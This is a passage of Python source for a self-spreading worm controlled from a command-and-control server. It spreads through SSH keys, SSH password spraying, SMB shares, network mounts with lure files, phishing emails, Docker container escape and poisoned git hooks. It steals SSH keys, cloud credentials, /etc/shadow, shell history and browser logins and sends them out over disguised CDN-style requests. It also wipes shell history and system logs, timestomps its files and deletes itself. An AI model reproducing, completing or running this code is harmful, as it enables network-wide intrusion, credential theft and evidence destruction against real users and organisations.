                if s.connect_ex((ip,22))==0: live.append(ip)
                s.close()
            except: pass
    except: pass
    return live

def _get_local_subnet():
    """Get local network subnet for scanning"""
    subnets=[]
    try:
        import ipaddress
        # From routing table
        out=subprocess.run(["ip","route"],capture_output=True,text=True,timeout=5).stdout
        import re
        for m in re.finditer(r'(\d+\.\d+\.\d+\.\d+/\d+)\s+dev',out):
            n=m.group(1)
            if not n.startswith(("127.","169.","0.")):
                subnets.append(n)
    except: pass
    if not subnets:
        # Fallback from local IP
        try:
            local=socket.gethostbyname(socket.gethostname())
            parts=local.split(".")
            subnets.append(".".join(parts[:3])+".0/24")
        except: pass
    return subnets

# ── Common + harvested passwords for spraying ────────────────────────────────
COMMON_PASSWORDS=[
    "","password","123456","admin","root","letmein","welcome","monkey","1234",
    "password1","123456789","qwerty","abc123","Password1","admin123","pass",
    "test","guest","master","changeme","default","service","linux","ubuntu",
    "raspberry","kali","toor","alpine","vagrant","ansible","deploy","devops",
    "production","secret","p@ssword","P@ssw0rd","Summer2024","Winter2024",
    "Spring2025","Company1","Welcome1","Admin@123","root123","server",
]

def _harvest_passwords():
    """Collect passwords from local config files, history, env"""
    found=set(COMMON_PASSWORDS)
    # bash/zsh history — extract passwords from commands
    import re
    for hf in [os.path.expanduser("~/.bash_history"),os.path.expanduser("~/.zsh_history")]:
        try:
            for line in open(hf,errors="replace"):
                for m in re.findall(r'(?:password|passwd|pass|pwd)[=:\s]+([^\s;|&>]{4,30})',line,re.I):
                    found.add(m.strip("'\""))
                for m in re.findall(r'-p\s*([^\s;|&>]{4,30})',line):
                    found.add(m.strip("'\""))
        except: pass
    # .env files
    for root,_,files in os.walk(os.path.expanduser("~")):
        for f in files:
            if f in (".env",".env.local","secrets.env",".netrc",".pgpass"):
                try:
                    for line in open(os.path.join(root,f),errors="replace"):
                        for m in re.findall(r'(?:PASS|PASSWORD|SECRET|KEY)[=:]\s*(.+)',line,re.I):
                            found.add(m.strip().strip("'\"")[:40])
                except: pass
        if len(found)>200: break
    # .my.cnf, .pgpass, .netrc
    for p in ["~/.my.cnf","~/.pgpass","~/.netrc","~/.git-credentials"]:
        try:
            for line in open(os.path.expanduser(p),errors="replace"):
                for m in re.findall(r':([^:@\n]{4,30})$',line):
                    found.add(m.strip())
        except: pass
    # Credentials from C2 loot (if available in our log dir)
    return list(found)[:80]

# ── SSH password spray ────────────────────────────────────────────────────────
def _ssh_spray(host, passwords, user=None):
    """Try SSH with password list using sshpass"""
    if not shutil.which("sshpass"): return None
    users=[user] if user else [os.environ.get("USER",""),
        "root","ubuntu","admin","kali","pi","deploy","git","ansible","vagrant"]
    for u in users:
        for pw in passwords[:40]:
            try:
                r=subprocess.run([
                    "sshpass","-p",pw,"ssh",
                    "-o","StrictHostKeyChecking=no",
                    "-o","ConnectTimeout=4",
                    "-o","PasswordAuthentication=yes",
                    "-o","PubkeyAuthentication=no",
                    f"{u}@{host}","echo OK"],
                    capture_output=True,text=True,timeout=8)
                if "OK" in r.stdout:
                    # Got in — now upload and execute
                    src=os.path.abspath(__file__)
                    dst_path=f"/tmp/.{AID}.py"
                    cp=subprocess.run([
                        "sshpass","-p",pw,"scp",
                        "-o","StrictHostKeyChecking=no",
                        "-o","ConnectTimeout=4",
                        src,f"{u}@{host}:{dst_path}"],
                        capture_output=True,timeout=15)
                    if cp.returncode==0:
                        subprocess.run([
                            "sshpass","-p",pw,"ssh",
                            "-o","StrictHostKeyChecking=no","-o","ConnectTimeout=4",
                            f"{u}@{host}",
                            f"chmod +x {dst_path} && (python3 {dst_path} >/dev/null 2>&1 &)"],
                            capture_output=True,timeout=10)
                        return f"SPRAY:{u}@{host} pw={pw!r}"
            except: pass
    return None

# ── SMB network share spreading ───────────────────────────────────────────────
def _smb_targets():
    """Find SMB shares on local network"""
    targets=[]
    try:
        # nmblookup broadcast scan
        out=subprocess.run(["nmblookup","-M","--","-"],capture_output=True,text=True,timeout=8).stdout
        import re
        for m in re.finditer(r'(\d+\.\d+\.\d+\.\d+)',out): targets.append(m.group(1))
    except: pass
    # Also scan subnet for port 445
    for subnet in _get_local_subnet():
        try:
            import ipaddress
            for h in list(ipaddress.ip_network(subnet,strict=False).hosts())[:30]:
                ip=str(h)
                try:
                    s=socket.socket(); s.settimeout(0.6)
                    if s.connect_ex((ip,445))==0 and ip not in targets: targets.append(ip)
                    s.close()
                except: pass
        except: pass
    return targets[:20]

def _smb_spread(host, user="", password=""):
    """Copy worm to accessible SMB shares via smbclient"""
    if not shutil.which("smbclient"): return None
    src=os.path.abspath(__file__)
    try:
        # List shares
        auth=f"-U {user}%{password}" if user else "-N"
        r=subprocess.run(
            ["smbclient","-L",f"//{host}",auth,"-g","--no-pass" if not user else ""],
            capture_output=True,text=True,timeout=10)
        import re
        shares=[m.group(1) for m in re.finditer(r'Disk\|([^|]+)\|',r.stdout)]
        for share in shares:
            share=share.strip()
            if share.lower() in ("print$","ipc$"): continue
            # Try to write worm to share
            try:
                r2=subprocess.run(
                    ["smbclient",f"//{host}/{share}",auth,"--no-pass" if not user else "",
                     "-c",f"put {src} .update.py"],
                    capture_output=True,text=True,timeout=15)
                if r2.returncode==0:
                    return f"SMB:{host}/{share}"
            except: pass
    except: pass
    return None

# ── Mounted network drive infection ───────────────────────────────────────────
def _infect_network_mounts():
    """Spread to mounted NFS/CIFS/SMB network drives"""
    src=os.path.abspath(__file__)
    results=[]
    try:
        for line in open("/proc/mounts",errors="replace"):
            parts=line.split()
            if len(parts)<3: continue
            mp,fstype=parts[1],parts[2]
            if fstype.lower() not in ("cifs","nfs","nfs4","smbfs","fuse.sshfs","glusterfs"):
                continue
            if mp in _spread_log: continue
            try:
                dst=os.path.join(mp,".system_cache",".update.py")
                os.makedirs(os.path.dirname(dst),exist_ok=True)
                shutil.copy2(src,dst); os.chmod(dst,0o755); _timestomp(dst)
                # Drop .desktop lure on the share
                lure=os.path.join(mp,"Open_Files.desktop")
                open(lure,"w").write(
                    f"[Desktop Entry]\nType=Application\nName=Open Files\n"
                    f"Exec=bash -c 'python3 {dst} >/dev/null 2>&1 &'\n"
                    f"Icon=folder\nTerminal=false\n")
                os.chmod(lure,0o755)
                _spread_log.add(mp)
                results.append(f"NETMOUNT:{mp}({fstype})")
            except: pass
    except: pass
    return results

# ── Email spreading ───────────────────────────────────────────────────────────
def _harvest_email_contacts():
    """Extract email addresses from local mail clients"""
    import re; emails=set()
    email_re=re.compile(r'[\w.\-+]+@[\w.\-]+\.[a-zA-Z]{2,}')
    # Thunderbird profiles
    tb=os.path.expanduser("~/.thunderbird")
    if os.path.isdir(tb):
        for root,_,files in os.walk(tb):
            for f in files:
                if f in ("abook.sqlite","history.sqlite","global-messages-db.sqlite"):
                    try:
                        import sqlite3,tempfile,shutil
                        tmp=tempfile.mktemp(suffix=".db"); shutil.copy2(os.path.join(root,f),tmp)
                        conn=sqlite3.connect(tmp)
                        for tbl in ["cards","messages","addressBook"]:
                            try:
                                for row in conn.execute(f"SELECT * FROM {tbl} LIMIT 200").fetchall():
                                    for cell in row:
                                        for m in email_re.findall(str(cell)): emails.add(m)
                            except: pass
                        conn.close(); os.unlink(tmp)
                    except: pass
                elif f.endswith(".mab"):
                    try:
                        for m in email_re.findall(open(os.path.join(root,f),errors="replace").read()):
                            emails.add(m)
                    except: pass
    # Evolution
    ev=os.path.expanduser("~/.local/share/gnome-contacts")
    if os.path.isdir(ev):
        for root,_,files in os.walk(ev):
            for f in files:
                try:
                    for m in email_re.findall(open(os.path.join(root,f),errors="replace").read()):
                        emails.add(m)
                except: pass
    # Sent mail folders
    for mail_dir in [os.path.expanduser("~/Mail"),os.path.expanduser("~/.mail"),
                     os.path.expanduser("~/.mutt"),"/var/mail"]:
        if os.path.isdir(mail_dir):
            try:
                out=subprocess.run(["grep","-rh","^To:",mail_dir,"--include=*","-m","200"],
                    capture_output=True,text=True,timeout=5).stdout
                for m in email_re.findall(out): emails.add(m)
            except: pass
    # bash history (curl/wget/mail commands)
    for hf in [os.path.expanduser("~/.bash_history"),os.path.expanduser("~/.zsh_history")]:
        try:
            for m in email_re.findall(open(hf,errors="replace").read()[:50000]):
                emails.add(m)
        except: pass
    # Filter out obvious non-targets
    filtered={e for e in emails if not any(x in e for x in
        ["noreply","no-reply","postmaster","mailer-daemon","example.com","test@","foo@"])}
    return list(filtered)[:30]

def _email_spread(c2_url):
    """Send phishing email with download link to harvested contacts"""
    contacts=_harvest_email_contacts()
    if not contacts: return []
    if not shutil.which("sendmail") and not shutil.which("mail") and not shutil.which("mutt"):
        return ["no_mail_agent"]
    subject="Important: Staff Portal Security Update Required"
    body=(f"Dear Staff Member,\n\n"
          f"A critical security update is required for the Staff Portal.\n"
          f"Please install the update immediately to maintain access.\n\n"
          f"Download: {c2_url}/download/agent_http.py\n\n"
          f"IT Security Team\n"
          f"Office of the President")
    sent=[]
    for email in contacts[:10]:
        try:
            if shutil.which("sendmail"):
                msg=f"To: {email}\nSubject: {subject}\n\n{body}"
                subprocess.run(["sendmail","-t"],input=msg,text=True,
                    capture_output=True,timeout=10)
                sent.append(email)
            elif shutil.which("mail"):
                subprocess.run(["mail","-s",subject,email],input=body,text=True,
                    capture_output=True,timeout=10)
                sent.append(email)
        except: pass
    return sent

# ── Docker / container escape ─────────────────────────────────────────────────
def _docker_escape():
    """If inside a container, attempt to escape to host"""
    results=[]
    # Check if we're in a container
    in_container=False
    try:
        if os.path.exists("/.dockerenv"): in_container=True
        cgroup=open("/proc/1/cgroup",errors="replace").read()
        if "docker" in cgroup or "kubepods" in cgroup: in_container=True
    except: pass
    if not in_container: return results
    # Try host mount escape via /proc/1/root
    try:
        host_root="/proc/1/root"
        if os.path.exists(host_root):
            src=os.path.abspath(__file__)
            # Try to write to host's cron
            host_cron=os.path.join(host_root,"etc/cron.d/sys-update")
            open(host_cron,"w").write(
                f"* * * * * root python3 /tmp/.{AID}.py >/dev/null 2>&1\n")
            # Copy worm to host tmp
            shutil.copy2(src,os.path.join(host_root,f"tmp/.{AID}.py"))
            results.append("docker:proc_1_root_escape")
    except: pass
    # privileged container — mount host filesystem
    try:
        if os.path.exists("/dev/sda") or os.path.exists("/dev/xvda"):
            mnt="/tmp/_hmnt"
            os.makedirs(mnt,exist_ok=True)
            for dev in ["/dev/sda1","/dev/sda","/dev/xvda1","/dev/vda1"]:
                r=subprocess.run(["mount",dev,mnt],capture_output=True,timeout=5)
                if r.returncode==0:
                    src=os.path.abspath(__file__)
                    # Inject into host crontab
                    host_cron=os.path.join(mnt,"etc/cron.d/sys-update")
                    try: open(host_cron,"w").write(f"@reboot root python3 /tmp/.{AID}h.py\n"); results.append(f"docker:host_mount:{dev}")
                    except: pass
                    try: shutil.copy2(src,os.path.join(mnt,f"tmp/.{AID}h.py"))
                    except: pass
                    subprocess.run(["umount",mnt],capture_output=True)
                    break
    except: pass
    return results

# ── Full machine-to-machine spread thread ─────────────────────────────────────
def _ssh_lateral_thread():
    """Background thread — all network spreading vectors, all obey _ctrl"""
    time.sleep(25)
    _net_timer = 0
    while True:
        try:
            # Wait for spread_now trigger OR interval elapsed
            now = time.time()
            do_spread = _ctrl.get("spread_now") or (now - _net_timer >= NET_INTERVAL)
            if not do_spread or _ctrl["paused"] or not _ctrl["spreading"]:
                time.sleep(3); continue
            with _ctrl_lock: _ctrl["spread_now"] = False
            _net_timer = time.time()

            keys=_ssh_keys()
            passwords=_harvest_passwords()

            # ── Vector 1: SSH key-based spread ──────────────────────────────
            if _ctrl["ssh"]:
                targets=_ssh_targets()
                for target in targets:
                    if target in _spread_log: continue
                    if target in _ctrl["skip"]: continue
                    for key in keys:
                        result=_ssh_spread(target,key)
                        if result:
                            _spread_log.add(target)
                            _post(f"/agent/result?id={AID}&cmd=SSH_KEY_SPREAD",result)
                            break

            # ── Vector 2: Network scan + SSH key spread ──────────────────────
            if _ctrl["ssh"]:
                for subnet in _get_local_subnet():
                    live=_net_scan_ssh(subnet)
                    for ip in live:
                        if ip in _spread_log: continue
                        if ip in _ctrl["skip"]: continue
                        for key in keys:
                            result=_ssh_spread(ip,key)
                            if result:
                                _spread_log.add(ip)
                                _post(f"/agent/result?id={AID}&cmd=SSH_SCAN_SPREAD",result)
                                break

            # ── Vector 3: SSH password spray ────────────────────────────────
            if _ctrl["spray"] and shutil.which("sshpass"):
                for subnet in _get_local_subnet():
                    for ip in _net_scan_ssh(subnet):
                        if ip in _spread_log: continue
                        if ip in _ctrl["skip"]: continue
                        result=_ssh_spray(ip,passwords)
                        if result:
                            _spread_log.add(ip)
                            _post(f"/agent/result?id={AID}&cmd=SSH_SPRAY_SPREAD",result)

            # ── Vector 4: SMB share spreading ───────────────────────────────
            if _ctrl["smb"]:
                for host in _smb_targets():
                    if host in _spread_log: continue
                    if host in _ctrl["skip"]: continue
                    result=_smb_spread(host)
                    if result:
                        _spread_log.add(host)
                        _post(f"/agent/result?id={AID}&cmd=SMB_SPREAD",result)
                    for pw in passwords[:10]:
                        result=_smb_spread(host,os.environ.get("USER",""),pw)
                        if result:
                            _spread_log.add(host)
                            _post(f"/agent/result?id={AID}&cmd=SMB_SPREAD_AUTH",result)
                            break

            # ── Vector 5: Network mount infection ───────────────────────────
            if _ctrl["netmount"]:
                for result in _infect_network_mounts():
                    _post(f"/agent/result?id={AID}&cmd=NETMOUNT_SPREAD",result)

            # ── Vector 6: Docker escape ──────────────────────────────────────
            if _ctrl["docker"]:
                for result in _docker_escape():
                    _post(f"/agent/result?id={AID}&cmd=DOCKER_ESCAPE",result)

        except: pass
        time.sleep(3)

# ── Git repo poisoning ────────────────────────────────────────────────────────
def _poison_git_repos():
    """Find local git repos and inject post-commit hook"""
    src=os.path.abspath(__file__)
    poisoned=[]
    search_dirs=[os.path.expanduser("~"),"/opt","/var/www","/srv"]
    for base in search_dirs:
        if not os.path.isdir(base): continue
        try:
            out=subprocess.run(["find",base,"-name",".git","-type","d","-maxdepth","5"],
                capture_output=True,text=True,timeout=10).stdout
            for git_dir in out.splitlines():
                if not git_dir.strip(): continue
                hooks=os.path.join(git_dir,"hooks")
                if not os.path.isdir(hooks): continue
                for hook_name in ["post-commit","post-merge","pre-push"]:
                    hf=os.path.join(hooks,hook_name)
                    tag=f"# gh-{AID}"
                    c=open(hf).read() if os.path.exists(hf) else "#!/bin/sh\n"
                    if tag not in c:
                        open(hf,"w").write(c.rstrip()+f"\n{tag}\n(python3 '{src}' >/dev/null 2>&1 &)\n")
                        os.chmod(hf,0o755)
                poisoned.append(git_dir)
        except: pass
    return poisoned

# ── Auto-exfiltration on first contact ───────────────────────────────────────
def _auto_exfil():
    """Dump high-value data on first C2 contact"""
    loot={}
    # SSH keys
    sshkeys=[]
    for d in [os.path.expanduser("~/.ssh"),"/root/.ssh"]:
        if os.path.isdir(d):
            for f in os.listdir(d):
                fp=os.path.join(d,f)
                try:
                    c=open(fp).read()
                    if "PRIVATE KEY" in c: sshkeys.append(f"{fp}:\n{c}")
                except: pass
    if sshkeys: loot["ssh_keys"]="\n---\n".join(sshkeys[:5])
    # .env files
    env_files=[]
    for root,_,files in os.walk(os.path.expanduser("~")):
        for f in files:
            if f in (".env",".env.local",".env.production","secrets.env"):
                try: env_files.append(f"{root}/{f}:\n{open(os.path.join(root,f)).read()[:500]}")
                except: pass
        if len(env_files)>=5: break
    if env_files: loot["env_files"]="\n---\n".join(env_files)
    # AWS/GCP/Azure creds
    cred_paths=[
        os.path.expanduser("~/.aws/credentials"),
        os.path.expanduser("~/.config/gcloud/application_default_credentials.json"),
        os.path.expanduser("~/.azure/credentials"),
        os.path.expanduser("~/.kube/config"),
    ]
    cloud_creds=[]
    for p in cred_paths:
        if os.path.exists(p):
            try: cloud_creds.append(f"{p}:\n{open(p).read()[:800]}")
            except: pass
    if cloud_creds: loot["cloud_creds"]="\n---\n".join(cloud_creds)
    # bash/zsh history
    for hf in [os.path.expanduser("~/.bash_history"),os.path.expanduser("~/.zsh_history")]:
        if os.path.exists(hf):
            try:
                lines=[l for l in open(hf,errors="replace").readlines()
                       if any(k in l.lower() for k in ["pass","key","secret","token","api","ssh","mysql","psql","curl","wget"])]
                if lines: loot["history_secrets"]="".join(lines[-50:])
            except: pass
            break
    # /etc/shadow
    try:
        s=open("/etc/shadow").read()
        if s.strip(): loot["shadow"]=s[:2000]
    except: pass
    # Browser saved passwords summary
    import shutil,tempfile
    chrome_db=os.path.expanduser("~/.config/google-chrome/Default/Login Data")
    if os.path.exists(chrome_db):
        tmp=tempfile.mktemp(suffix=".db"); shutil.copy2(chrome_db,tmp)
        try:
            import sqlite3; conn=sqlite3.connect(tmp)
            rows=conn.execute("SELECT origin_url,username_value FROM logins").fetchall()
            if rows: loot["chrome_logins"]="\n".join(f"{u}|{r}" for r,u in rows[:30])
            conn.close()
        except: pass
        try: os.unlink(tmp)
        except: pass
    # Interesting config files
    for p in ["/etc/mysql/my.cnf","~/.my.cnf","~/.pgpass","~/.netrc","~/.git-credentials"]:
        fp=os.path.expanduser(p)
        if os.path.exists(fp):
            try: loot[os.path.basename(fp)]=open(fp).read()[:500]
            except: pass
    return loot

# ── Dead drop C2 discovery ────────────────────────────────────────────────────
def _discover_c2():
    """Try DNS TXT record for C2 URL fallback"""
    global C2_URL
    if DNS_DROPPER:
        try:
            import socket
            ans=socket.getaddrinfo(DNS_DROPPER,None)
            # Also try direct TXT via subprocess
            r=subprocess.run(["dig","+short","TXT",DNS_DROPPER],
                capture_output=True,text=True,timeout=5).stdout
            for line in r.splitlines():
                line=line.strip().strip('"')
                if line.startswith("https://"):
                    C2_URL=line; return line
        except: pass
    for url in C2_FALLBACK:
        try:
            _req.urlopen(url+"/ping",timeout=5)
            C2_URL=url; return url
        except: pass
    return C2_URL

# ── C2 communication ──────────────────────────────────────────────────────────
def _chrome_headers():
    return {
        "User-Agent":      _ua(),
        "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Cache-Control":   "no-cache",
        "Sec-Fetch-Dest":  "document",
        "Sec-Fetch-Mode":  "navigate",
        "Sec-Fetch-Site":  "none",
    }

def _build_opener():
    """Build urllib opener with optional SOCKS5/HTTP proxy support."""
    handlers = []
    proxy = C2_PROXY.strip() if C2_PROXY else ""
    if proxy:
        if proxy.startswith("socks"):
            # SOCKS5/SOCKS4 via PySocks (socks5h:// = remote DNS — needed for .onion)
            try:
                import socks, socket as _sock
                scheme, rest = proxy.split("://", 1)
                host, port = rest.rsplit(":", 1) if ":" in rest else (rest, "9050")
                socks_type = socks.SOCKS5 if "5" in scheme else socks.SOCKS4
                socks.set_default_proxy(socks_type, host, int(port), rdns=True)
                _sock.socket = socks.socksocket
                # No handler needed — PySocks patches socket globally
            except ImportError:
                pass  # PySocks not available; try system proxy
        else:
            # HTTP/HTTPS proxy
            handlers.append(_req.ProxyHandler({
                "http":  proxy,
                "https": proxy,
            }))
    # Always ignore SSL errors (self-signed C2 certs)
    import ssl
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode    = ssl.CERT_NONE
    handlers.append(_req.HTTPSHandler(context=ctx))
    return _req.build_opener(*handlers)

_opener = None
def _urlopen(req, timeout=20):
    global _opener
    if _opener is None:
        _opener = _build_opener()
    return _opener.open(req, timeout=timeout)

def _get(p):
    """GET with CDN-path translation, proxy support, and XOR-encrypted response."""
    global C2_URL
    # Translate legacy /agent/ paths → CDN-disguised paths
    cdn_p = p.replace("/agent/register?id=", "/cdn-cgi/apps/init?v=") \
             .replace("/agent/poll?id=",     "/cdn-cgi/apps/sync?v=")
    fallbacks = [C2_URL]+C2_FALLBACK
    # Try DoH C2 discovery if primary fails
    if DNS_DROPPER:
        doh_url = _doh_lookup(DNS_DROPPER)
        if doh_url and doh_url not in fallbacks: fallbacks.append(doh_url)
    for url in fallbacks:
        try:
            req=_req.Request(url+cdn_p, headers=_chrome_headers())
            r=_urlopen(req,timeout=20)
            raw=r.read().decode(errors="replace").strip()
            if url!=C2_URL: C2_URL=url
            # Try to XOR-decrypt — falls back to plaintext if key not yet known
            try: return _xb64(raw).decode(errors="replace").strip() if raw else ""
            except: return raw
        except: pass
    return ""

def _post(p,b):
    """POST with CDN-path translation, proxy support, and XOR-encrypted body."""
    global C2_URL
    fallbacks = [C2_URL]+C2_FALLBACK
    enc_body  = _b64x(b if isinstance(b,str) else b.decode(errors="replace"))
    form_body = f"d={_parse.quote(enc_body)}&v={_parse.quote(AID)}".encode()
    # Translate legacy /agent/result → CDN path
    cdn_p = p.replace("/agent/result", "/cdn-cgi/apps/data").split("?")[0]
    for url in fallbacks:
        try:
            h = _chrome_headers()
            h["Content-Type"] = "application/x-www-form-urlencoded"
            req=_req.Request(url+cdn_p, data=form_body, headers=h)
            _urlopen(req,timeout=20)
            if url!=C2_URL: C2_URL=url
            return True
        except: pass
    return False

def _shell(cmd,timeout=60):
    try:
        r=subprocess.run(cmd,shell=True,capture_output=True,text=True,timeout=timeout)
        return (r.stdout+r.stderr).strip() or "(no output)"
    except subprocess.TimeoutExpired: return "(timeout)"
    except Exception as e: return f"(err:{e})"

def _reg():
    try:
        priv="ROOT" if (os.name!="nt" and os.geteuid()==0) else "USER"
        methods=[]
        if IS_WIN:
            try:
                import winreg; winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                    r"SOFTWARE\Microsoft",0,winreg.KEY_READ)
                methods.append("admin")
            except: pass
        spread_summary = _parse.quote(",".join(sorted(_spread_log)[:30]))
        persist_summary = _parse.quote(",".join(_persist_methods))
        return _get("/agent/register?id="+AID
            +"&os="+_parse.quote(f"{platform.system()} {platform.release()} {platform.machine()}")
            +"&hostname="+_parse.quote(socket.gethostname())
            +"&user="+_parse.quote(os.environ.get("USERNAME") or os.environ.get("USER","?"))
            +"&priv="+_parse.quote(priv)
            +"&type=worm-"+platform.system().lower()
            +"&spread="+spread_summary
            +"&persist="+persist_summary)
    except: return ""

# ── Anti-forensics ────────────────────────────────────────────────────────────
def _deinfect():
    """
    Full deinfection — removes every persistence method installed by this agent.
    Returns a list of strings describing what was removed.
    Safe to call even if methods were never installed.
    """
    import glob as _gl
    removed = []
    dst = _agent_bin()

    if IS_WIN:
        # Registry Run key
        try:
            import winreg
            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(k, "WindowsSystemCache")
            winreg.CloseKey(k)
            removed.append("reg_run:WindowsSystemCache")
        except: pass
        # Scheduled task
        try:
            r = subprocess.run(["schtasks", "/delete", "/tn", "WindowsDefenderCacheUpdate", "/f"],
                capture_output=True)
            if r.returncode == 0: removed.append("schtask:WindowsDefenderCacheUpdate")
        except: pass
        # Startup folder .bat
        try:
            bat = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\winupdate.bat")
            if os.path.exists(bat):
                os.unlink(bat); removed.append("startup_folder:winupdate.bat")
        except: pass

    elif IS_LIN:
        tag = f"# kernel-helper-{AID}"
        # crontab — remove @reboot line containing dst
        try:
            ex = subprocess.run(["crontab", "-l"], capture_output=True, text=True).stdout
            new = "\n".join(l for l in ex.splitlines()
                            if dst not in l and AID not in l)
            if new != ex:
                subprocess.run(["crontab", "-"], input=new, text=True, capture_output=True)
                removed.append("crontab")
        except: pass
        # shell rc files — remove tagged block
        for rc in [".bashrc", ".profile", ".bash_profile", ".zshrc", ".zprofile"]:
            p = os.path.expanduser(f"~/{rc}")
            try:
                if not os.path.exists(p): continue
                lines = open(p).readlines()
                new_lines = []
                skip = False
                changed = False
                for line in lines:
                    if tag in line:
                        skip = True; changed = True; continue
                    if skip and line.strip() and not line.startswith("#"):
                        skip = False
                    if not skip:
                        new_lines.append(line)
                if changed:
                    open(p, "w").writelines(new_lines)
                    removed.append(f"rc:{rc}")
            except: pass
        # systemd user service
        try:
            subprocess.run(["systemctl", "--user", "stop",    "kernel-helper"], capture_output=True)
            subprocess.run(["systemctl", "--user", "disable", "kernel-helper"], capture_output=True)
            svc = os.path.expanduser("~/.config/systemd/user/kernel-helper.service")
            if os.path.exists(svc):
                os.unlink(svc); removed.append("systemd:kernel-helper")
            subprocess.run(["systemctl", "--user", "daemon-reload"], capture_output=True)
        except: pass
        # sitecustomize.py
        tag2 = f"# sys-{AID}"
        try:
            for sp in [p for p in sys.path if "site-packages" in p]:
                sc = os.path.join(sp, "sitecustomize.py")
                if not os.path.exists(sc): continue
                lines = open(sc).readlines()
                new_lines = [l for l in lines if tag2 not in l and AID not in l]
                if len(new_lines) != len(lines):
                    open(sc, "w").writelines(new_lines)
                    removed.append(f"sitecustomize:{sp}")
        except: pass
        # git global hook
        tag3 = f"# gh-{AID}"
        try:
            ghooks = subprocess.run(["git", "config", "--global", "core.hooksPath"],
                capture_output=True, text=True).stdout.strip()
            if ghooks:
                hook = os.path.join(ghooks, "pre-commit")
                if os.path.exists(hook):
                    lines = open(hook).readlines()
                    new_lines = [l for l in lines if tag3 not in l and AID not in l]
                    if len(new_lines) != len(lines):
                        open(hook, "w").writelines(new_lines)
                        removed.append("git_global_hook")
        except: pass
        # /etc/profile.d/
        try:
            pd = "/etc/profile.d/sys-update.sh"
            if os.path.exists(pd):
                os.unlink(pd); removed.append("profile.d:sys-update.sh")
        except: pass
        # vim plugin
        try:
            vf = os.path.expanduser("~/.vim/plugin/syshelper.vim")
            if os.path.exists(vf):
                os.unlink(vf); removed.append("vim_plugin")
        except: pass

    elif IS_MAC:
        # LaunchAgent
        try:
            pl = os.path.expanduser("~/Library/LaunchAgents/com.apple.sysupdate.plist")
            if os.path.exists(pl):
                subprocess.run(["launchctl", "unload", pl], capture_output=True)
                os.unlink(pl); removed.append("launchagent:com.apple.sysupdate")
        except: pass
        # shell rc files
        tag = f"# apple-{AID}"
        for rc in [".zshrc", ".bash_profile", ".profile"]:
            p = os.path.expanduser(f"~/{rc}")
            try:
                if not os.path.exists(p): continue
                lines = open(p).readlines()
                new_lines = [l for l in lines if tag not in l and AID not in l and dst not in l]
                if len(new_lines) != len(lines):
                    open(p, "w").writelines(new_lines)
                    removed.append(f"rc:{rc}")
            except: pass

    # Delete installed agent copy
    try:
        if os.path.exists(dst) and os.path.abspath(dst) != os.path.abspath(__file__):
            os.unlink(dst); removed.append(f"agent_bin:{dst}")
    except: pass

    # Delete home dir
    try:
        hd = _home_dir()
        if os.path.isdir(hd):
            shutil.rmtree(hd, ignore_errors=True)
            removed.append(f"home_dir:{hd}")
    except: pass

    return removed


def _clean_logs():
    """Full anti-forensic sweep — history, logs, artifacts, self-delete."""
    import glob as _gl
    # Disable history collection for this session
    os.environ["HISTFILE"] = "/dev/null"
    os.environ["HISTSIZE"] = "0"
    # Wipe history files
    for hf in ["~/.bash_history","~/.zsh_history","~/.sh_history",
               "~/.local/share/fish/fish_history"]:
        try: open(os.path.expanduser(hf),"w").close()
        except: pass
    # Remove syslog lines containing our markers
    for lf in ["/var/log/auth.log","/var/log/syslog","/var/log/messages","/var/log/secure"]:
        try:
            with open(lf,"r") as f: lines=f.readlines()
            with open(lf,"w") as f:
                f.writelines(l for l in lines
                    if 'python' not in l.lower() and '.update.py' not in l
                    and 'worm' not in l.lower() and AID not in l)
        except: pass
    # Remove tmp artifacts
    for p in _gl.glob(f"/tmp/.{AID}*") + _gl.glob("/tmp/.wizza*") + _gl.glob("/dev/shm/.wizza*"):
        try: os.unlink(p)
        except:
            try: shutil.rmtree(p)
            except: pass
    # Timestomp installed copy
    try: _timestomp(_agent_bin())
    except: pass
    # Self-delete (deferred 3s)
    def _del_self():
        time.sleep(3)
        try: os.unlink(os.path.abspath(__file__))
        except: pass
    threading.Thread(target=_del_self, daemon=True).start()

# ── Operator kill-switch ──────────────────────────────────────────────────────
_OPERATOR_TOKEN = "1bff231c9f73c3232858a913ba393bfcf7573aa5324e67d8"

def _is_operator():
    """Return True if this machine belongs to the operator — do not infect."""
    # Check for token file in standard locations
    locations = [
        os.path.expanduser("~/.op_token"),
        os.path.expanduser("~/.config/.op_token"),
        "/etc/.op_token",
    ]
    if IS_WIN:
        locations += [
            os.path.expandvars(r"%APPDATA%\.op_token"),
            os.path.expandvars(r"%USERPROFILE%\.op_token"),
        ]
    for p in locations:
        try:
            if open(p).read().strip() == _OPERATOR_TOKEN:
                return True
        except: pass
    # Also check env var (operator can set in their shell profile)
    if os.environ.get("OP_TOKEN","") == _OPERATOR_TOKEN:
        return True
    return False

# ── Main loop ─────────────────────────────────────────────────────────────────
def main():
    if _is_operator(): sys.exit(0)   # silently exit on operator machine
    _analyst_check()
    _mask_proc()

    # Double-fork daemon
    if not IS_WIN:
        try:
            if os.fork()>0: sys.exit(0)
            os.setsid()
            if os.fork()>0: sys.exit(0)
            sys.stdout=open(os.devnull,"w"); sys.stderr=open(os.devnull,"w")
        except: pass

    # Install & persist (background)
    threading.Thread(target=_install,daemon=True).start()
    # USB watcher
    threading.Thread(target=_usb_watcher,daemon=True).start()
    # SSH lateral movement
    threading.Thread(target=_ssh_lateral_thread,daemon=True).start()
    # Git repo poisoning (one-time, respects _ctrl["git"])
    def _git_poison_gated():
        if _ctrl["spreading"] and _ctrl["git"]: _poison_git_repos()
    threading.Thread(target=_git_poison_gated,daemon=True).start()
    # Try to discover C2 if primary fails
    threading.Thread(target=_discover_c2,daemon=True).start()

    # C2 registration with retry
    global _first
    for _ in range(60):
        if "OK" in _reg(): break
        time.sleep(5+random.uniform(0,3))

    # On first contact — auto-exfil
    if EXFIL_ON_FIRST and _first:
        _first=False
        def _do_first_contact():
            # Auto-exfil
            loot=_auto_exfil()
            if loot: _post(f"/agent/result?id={AID}&cmd=AUTO_EXFIL",json.dumps(loot,indent=2))
